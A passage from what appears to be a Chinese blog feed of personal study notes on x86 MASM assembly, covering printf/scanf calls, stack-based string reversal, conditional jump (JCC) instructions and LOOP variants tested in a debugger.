punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="19"></td><td><pre>main proc</pre></td></tr><tr><td data-num="20"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="21"></td><td><pre>	call crt_printf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">;</span>栈平</pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220121210512511.png" alt="image-20220121210512511" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到 &quot;Hello World!&quot; 被打印出来了</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220121210417637.png" alt="image-20220121210417637" /></p>
<p>printf 的输出有了，那么 scanf 的输入如何在控制台上接收呢？</p>
<p><strong>scanf 的两个参数</strong></p>
<ul>
<li>字符串</li>
<li>取地址</li>
</ul>
<p>格式化字符串进行接收</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>format db <span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p>然后我们需要传递两个参数进去</p>
<p>一个是需要用来容纳接收参数的一个字符串</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>已经初始化好了的字符串</pre></td></tr><tr><td data-num="2"></td><td><pre>text2 db <span class="token operator">?</span><span class="token punctuation">;</span>由系统进行初始化</pre></td></tr><tr><td data-num="3"></td><td><pre>text3 db <span class="token number">0</span><span class="token punctuation">;</span>自己初始化为零</pre></td></tr></table></figure><p><strong>调用 scanf 函数</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>call crt_scanf</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>text2 db <span class="token number">0</span></pre></td></tr><tr><td data-num="18"></td><td><pre>format db <span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	push offset text2</pre></td></tr><tr><td data-num="23"></td><td><pre>	push offset format</pre></td></tr><tr><td data-num="24"></td><td><pre>	call crt_scanf</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	push offset text2</pre></td></tr><tr><td data-num="27"></td><td><pre>	call crt_printf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="30"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="31"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="32"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220121212310361.png" alt="image-20220121212310361" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到接收完之后又打印出来了</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220121212110261.png" alt="image-20220121212110261" /></p>
<p>如此使用 scanf 和 printf 的输入输出就实现了</p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之条件跳转指令JCC与条件循环指令LOOP学习</title>
    <url>/article/b33bdacd.html</url>
    <content><![CDATA[<p>在学习条件跳转指令之前，插入一个堆栈学习的测试样例。</p>
<p><strong>堆栈操作之逆序输出</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>source byte <span class="token string">"My name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre>sourcesize <span class="token operator">=</span> <span class="token punctuation">(</span>$ <span class="token operator">-</span> source<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="20"></td><td><pre>main proc</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ecx<span class="token punctuation">,</span>sourcesize</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	movzx eax<span class="token punctuation">,</span>source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	push eax</pre></td></tr><tr><td data-num="26"></td><td><pre>	inc esi</pre></td></tr><tr><td data-num="27"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="28"></td><td><pre>	mov ecx<span class="token punctuation">,</span>sourcesize</pre></td></tr><tr><td data-num="29"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	pop eax</pre></td></tr><tr><td data-num="32"></td><td><pre>	mov source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span>al</pre></td></tr><tr><td data-num="33"></td><td><pre>	inc esi</pre></td></tr><tr><td data-num="34"></td><td><pre>	loop lq</pre></td></tr><tr><td data-num="35"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="37"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="38"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="39"></td><td><pre>END main</pre></td></tr></table></figure><p>测试代码运行结果，可以看到成功将字符串逆序输出了。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220125184659002.png" alt="image-20220125184659002" /></p>
<h2 id="条件跳转指令jcc"><a class="anchor" href="#条件跳转指令jcc">#</a> 条件跳转指令 JCC</h2>
<p>JCC 指条件跳转指令，CC 就是指条件码。</p>
<table>
<thead>
<tr>
<th>JCC 指令</th>
<th>中文含义</th>
<th>英文原意</th>
<th>检查符号位</th>
<th>典型 C 应用</th>
</tr>
</thead>
<tbody>
<tr>
<td>JZ/JE</td>
<td>若为 0 则跳转；若相等则跳转；</td>
<td>jump if zero;jump if equal</td>
<td>ZF=1</td>
<td>if (i == j);if (i == 0);</td>
</tr>
<tr>
<td>JNZ/JNE</td>
<td>若不为 0 则跳转；若不相等则跳转；</td>
<td>jump if not zero;jump if not equal</td>
<td>ZF=0</td>
<td>if (i != j);if (i != 0);</td>
</tr>
<tr>
<td>JS</td>
<td>若为负则跳转；</td>
<td>jump if sign</td>
<td>SF=1</td>
<td>if (i &lt; 0);</td>
</tr>
<tr>
<td>JNS</td>
<td>若为正则跳转；</td>
<td>jump if not sign</td>
<td>SF=0</td>
<td>if (i &gt; 0);</td>
</tr>
<tr>
<td>JP/JPE</td>
<td>若 1 出现次数为偶数则跳转；</td>
<td>jump if Parity (Even)</td>
<td>PF=1</td>
<td>(null)</td>
</tr>
<tr>
<td>JNP/JPO</td>
<td>若 1 出现次数为奇数则跳转；</td>
<td>jump if not parity (odd)</td>
<td>PF=0</td>
<td>(null)</td>
</tr>
<tr>
<td>JO</td>
<td>若溢出则跳转；</td>
<td>jump if overflow</td>
<td>OF=1</td>
<td>(null)</td>
</tr>
<tr>
<td>JNO</td>
<td>若无溢出则跳转；</td>
<td>jump if not overflow</td>
<td>OF=0</td>
<td>(null)</td>
</tr>
<tr>
<td>JC/JB/JNAE</td>
<td>若进位则跳转；若低于则跳转；若不高于等于则跳转；</td>
<td>jump if carry;jump if below;jump if not above equal</td>
<td>CF=1</td>
<td>if (i &lt; j);</td>
</tr>
<tr>
<td>JNC/JNB/JAE</td>
<td>若无进位则跳转；若不低于则跳转；若高于等于则跳转；</td>
<td>jump if not carry;jump if not below;jump if above equal</td>
<td>CF=0</td>
<td>if (i &gt;= j);</td>
</tr>
<tr>
<td>JBE/JNA</td>
<td>若低于等于则跳转；若不高于则跳转；</td>
<td>jump if below equal;jump if not above</td>
<td>ZF=1 或 CF=1</td>
<td>if (i &lt;= j);</td>
</tr>
<tr>
<td>JNBE/JA</td>
<td>若不低于等于则跳转；若高于则跳转；</td>
<td>jump if not below equal;jump if above</td>
<td>ZF=0 或 CF=0</td>
<td>if (i &gt; j);</td>
</tr>
<tr>
<td>JL/JNGE</td>
<td>若小于则跳转；若不大于等于则跳转；</td>
<td>jump if less;jump if not greater equal</td>
<td>SF != OF</td>
<td>if (si &lt; sj);</td>
</tr>
<tr>
<td>JNL/JGE</td>
<td>若不小于则跳转；若大于等于则跳转；</td>
<td>jump if not less;jump if greater equal</td>
<td>SF = OF</td>
<td>if (si &gt;= sj);</td>
</tr>
<tr>
<td>JLE/JNG</td>
<td>若小于等于则跳转；若不大于则跳转；</td>
<td>jump if less equal;jump if not greater</td>
<td>ZF != OF 或 ZF=1</td>
<td>if (si &lt;= sj);</td>
</tr>
<tr>
<td>JNLE/JG</td>
<td>若不小于等于则跳转；若大于则跳转；</td>
<td>jump if not less equal;jump if greater</td>
<td>SF=0F 且 ZF=0</td>
<td>if(si&gt;sj);</td>
</tr>
</tbody>
</table>
<h3 id="je指令学习测试"><a class="anchor" href="#je指令学习测试">#</a> JE 指令学习测试</h3>
<p>根据 je 指令的特性 &quot;若为 0 则跳转；若相等则跳转&quot;，也就是说若前面赋值的 eax 与后一个数进行比较之后，通过 je 指令测试，若相等就进行跳转</p>
<h5 id="测试样例"><a class="anchor" href="#测试样例">#</a> 测试样例</h5>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">250</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	cmp eax<span class="token punctuation">,</span><span class="token number">250</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	je lp</pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><h5 id="断点测试"><a class="anchor" href="#断点测试">#</a> 断点测试</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127200800894.png" alt="image-20220127200800894" /></p>
<p>可以发现 eax 的值变成了 FA 也就是 250</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127200832474.png" alt="image-20220127200832474" /></p>
<p>再次运行可以发现 je 实现跳转，一直测试一直跳转</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127201050380.png" alt="image-20220127201050380" /></p>
<p>测试当 eax 值不等的情况下是否进行跳转，给 eax 赋值为 251</p>
<p>进行测试</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127202159243.png" alt="image-20220127202159243" /></p>
<p>当进行后 eax 的值变为 FB，也就是 251</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127202307848.png" alt="image-20220127202307848" /></p>
<p>进行测试后发现，直接进行下一步并没有实现跳转，由此可以发现 je 的跳转条件。</p>
<p>其它指令的作用效果皆可通过测试发现，也可通过金手指查看其它指令作用</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127202632987.png" alt="image-20220127202632987" /></p>
<h2 id="条件循环指令loop"><a class="anchor" href="#条件循环指令loop">#</a> 条件循环指令 LOOP</h2>
<p>通过之前的学习，我们知道 loop 指令循环的基本条件是 <code>ecx &gt; 0</code></p>
<h3 id="loop指令学习测试"><a class="anchor" href="#loop指令学习测试">#</a> LOOP 指令学习测试</h3>
<h4 id="测试样例-2"><a class="anchor" href="#测试样例-2">#</a> 测试样例</h4>
<p>通过 loop 指令使 eax 自增 10 次</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">;</span>循环计数器，每执行一次ecx <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="22"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><h4 id="断点测试-2"><a class="anchor" href="#断点测试-2">#</a> 断点测试</h4>
<p>可以看到初始值均为 0</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204201234.png" alt="image-20220127204201234" /></p>
<p>执行一次后 eax = 1</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204228389.png" alt="image-20220127204228389" /></p>
<p>ecx 的值由 10 变成了 9</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204251076.png" alt="image-20220127204251076" /></p>
<p>执行第二次，eax = 2</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204345379.png" alt="image-20220127204345379" /></p>
<p>而 ecx 变成了 8</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204409268.png" alt="image-20220127204409268" /></p>
<p>如此直至 ecx=0 结束</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204442469.png" alt="image-20220127204442469" /></p>
<h3 id="loopz指令学习"><a class="anchor" href="#loopz指令学习">#</a> loopz 指令学习</h3>
<p>loopz 的跳转条件 <code>ecx &gt; 0 &amp;&amp; zf = 1</code></p>
<p>使用 loopz 后测试可以看到 zf 位的值为 1</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127204931747.png" alt="image-20220127204931747" /></p>
<p>测试之后发现 ZR = 0 后</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205042744.png" alt="image-20220127205042744" /></p>
<p>并没有实现跳转</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205114152.png" alt="image-20220127205114152" /></p>
<p>给 eax 赋值为 1 进行测试，并让 eax 自减</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205255261.png" alt="image-20220127205255261" /></p>
<p>第一次执行 eax 自减为 0，而 ZR = 1</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205340317.png" alt="image-20220127205340317" /></p>
<p>成功实现跳转</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205405729.png" alt="image-20220127205405729" /></p>
<p>第二次执行 ZR = 0</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205437074.png" alt="image-20220127205437074" /></p>
<p>并未实现跳转</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205459990.png" alt="image-20220127205459990" /></p>
<h3 id="loopnz指令学习"><a class="anchor" href="#loopnz指令学习">#</a> loopnz 指令学习</h3>
<p><strong>n = not</strong></p>
<p>loopnz 的跳转条件 <code>ecx &gt; 0 &amp;&amp; zf = 0</code> ，即等于 0 进行跳转，等于 1 不进行跳转</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205919545.png" alt="image-20220127205919545" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205931779.png" alt="image-20220127205931779" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127205948743.png" alt="image-20220127205948743" /></p>
<p>将 dec 改为 inc，并将 eax 赋值为 0 进行测试</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127210233083.png" alt="image-20220127210233083" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127210250862.png" alt="image-20220127210250862" /></p>
<p>实现跳转</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220127210309969.png" alt="image-20220127210309969" /></p>
<h3 id="loope与loopne指令学习"><a class="anchor" href="#loope与loopne指令学习">#</a> loope 与 loopne 指令学习</h3>
<p>loope 与 loopz 不同的是，loope 以 cmp 为跳转条件，而 loopz 以加减法为跳转条件</p>
<p>即 loope 是以其操作数的比较值作为跳转条件的，若操作数相等，其结果为 0 进行跳转</p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言初步学习记录</title>
    <url>/article/e0c9facc.html</url>
    <content><![CDATA[<h2 id="0x01汇编语言概述"><a class="anchor" href="#0x01汇编语言概述">#</a> 0x01. 汇编语言概述</h2>
<p><strong>汇编</strong>： 源程序在计算机中不能直接被识别和执行，所以需要经过翻译，产生机器代码，这种翻译过程称为汇编；<br />
<strong>源程序</strong>： 用汇编语言编写的程序；<br />
<strong>助记符</strong>： 选用了一些能反映机器指令功能的单词或词组来代表该机器指令。这些选出来的单词称为助记符。<br />
<strong>汇编语言</strong>： 是一种用于微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。</p>
<ul>
<li>在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码；</li>
<li>用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。</li>
</ul>
<p><strong>汇编程序</strong>： 是执行把汇编语言源程序翻译成机器能够识别和执行的目标程序（即二进制的机器代码程序）任务的一种系统程序；<br />
<strong>机器语言</strong>： 用二进制代码表示，计算机能直接识别和执行的一种机器指令系统的集合；</p>
<p><strong>汇编语言程序</strong>： 用汇编语言编写的源程序；</p>
<p>汇编程序与汇编语言程序是两个不同的概念。<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117174533125.png" alt="image-20220117174533125" /></p>
<p><strong>指令性语句</strong>： CPU 执行的语句，能够生成目标代码，核心是指令系统中的指令。<br />
<strong>指示性语句</strong>： CPU 不执行，而由汇编程序执行的语句，不生成目标代码，核心是伪指令。</p>
<p><strong>指令语句的格式</strong>：（由四段组成）</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/20191005215356991.png" alt="image-20191005215356991" /></p>
<ul>
<li>在汇编语言中，名字后无冒号，标号后一定带冒号；</li>
<li>语句的各个组成部分间要有分隔符（常用空格 or 制表符）；</li>
<li>标号或名字一般由字母、数字及规定的特殊字符组成，数字不可开头。字符数最长不超过 31 个；</li>
<li>每个指令语句必须有助记符域。</li>
</ul>
<p><strong>伪指令</strong> 语句的格式：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/20191005220600873.png" alt="image-20191005220600873" /></p>
<p><strong>名字</strong>： 变量的符号地址，其后不加冒号；<br />
<strong>操作数</strong>： 指示性语句中至少有一个操作数。</p>
<p>EX1. 先从一个简单的 8086 汇编语言程序示例来了解汇编语言程序的格式、结构及规范。这是一个完成将 100 个字的数据块从输入缓冲区搬到输出缓冲区的实例。源程序如下所示。</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>DATA		SEGMENT                     <span class="token punctuation">;</span>定义代码段</pre></td></tr><tr><td data-num="2"></td><td><pre>INBUFF  	DW 	<span class="token number">100</span> <span class="token function">DUP</span> <span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>        <span class="token punctuation">;</span>输入缓冲区</pre></td></tr><tr><td data-num="3"></td><td><pre>OUTBUFF 	DW 	<span class="token number">100</span> <span class="token function">DUP</span> <span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>        <span class="token punctuation">;</span>输出缓冲区</pre></td></tr><tr><td data-num="4"></td><td><pre>DATA   	ENDS                             <span class="token punctuation">;</span>定义数据段结束</pre></td></tr><tr><td data-num="5"></td><td><pre>STACKS  	SEGMENT   PARA  STACK  ‘STACK’</pre></td></tr><tr><td data-num="6"></td><td><pre>STA	    DB       <span class="token number">100</span>H   <span class="token function">DUP</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>TOP	    EQU     LEHGTH   STA</pre></td></tr><tr><td data-num="8"></td><td><pre>STACKS  	ENDS</pre></td></tr><tr><td data-num="9"></td><td><pre>CODE  SEGMENT                  	<span class="token punctuation">;</span>定义代码段</pre></td></tr><tr><td data-num="10"></td><td><pre>ASSUME CS<span class="token operator">:</span>CODE<span class="token punctuation">,</span>DS<span class="token operator">:</span>DATA<span class="token punctuation">,</span>ES<span class="token operator">:</span>DATA<span class="token punctuation">,</span>SS<span class="token operator">:</span>STACKS  </pre></td></tr><tr><td data-num="11"></td><td><pre>START<span class="token operator">:</span>  MOV   AX<span class="token punctuation">,</span>DATA</pre></td></tr><tr><td data-num="12"></td><td><pre>        MOV    DS<span class="token punctuation">,</span>  AX</pre></td></tr><tr><td data-num="13"></td><td><pre>        MOV    DS<span class="token punctuation">,</span>  AX</pre></td></tr><tr><td data-num="14"></td><td><pre> 	      MOV    AX<span class="token punctuation">,</span>  STACKS</pre></td></tr><tr><td data-num="15"></td><td><pre>          MOV    SS<span class="token punctuation">,</span>  AX</pre></td></tr><tr><td data-num="16"></td><td><pre>          MOV    SP<span class="token punctuation">,</span>  TOP    	</pre></td></tr><tr><td data-num="17"></td><td><pre>INIT：    MOV   SI<span class="token punctuation">,</span>OFFSET INBUFF  <span class="token punctuation">;</span>设置输入缓冲区指针</pre></td></tr><tr><td data-num="18"></td><td><pre>     	    LEA     DI<span class="token punctuation">,</span>OUTBUFF            <span class="token punctuation">;</span>设置输出缓冲区指针</pre></td></tr><tr><td data-num="19"></td><td><pre>     	    MOV   CX<span class="token punctuation">,</span><span class="token number">100</span>              	           <span class="token punctuation">;</span>块长度送CX</pre></td></tr><tr><td data-num="20"></td><td><pre> REP      MOVSB			 	<span class="token punctuation">;</span>块搬移</pre></td></tr><tr><td data-num="21"></td><td><pre>    	    MOV    AX<span class="token punctuation">,</span><span class="token number">4</span>C00H                 	<span class="token punctuation">;</span>DOS功能调用语句</pre></td></tr><tr><td 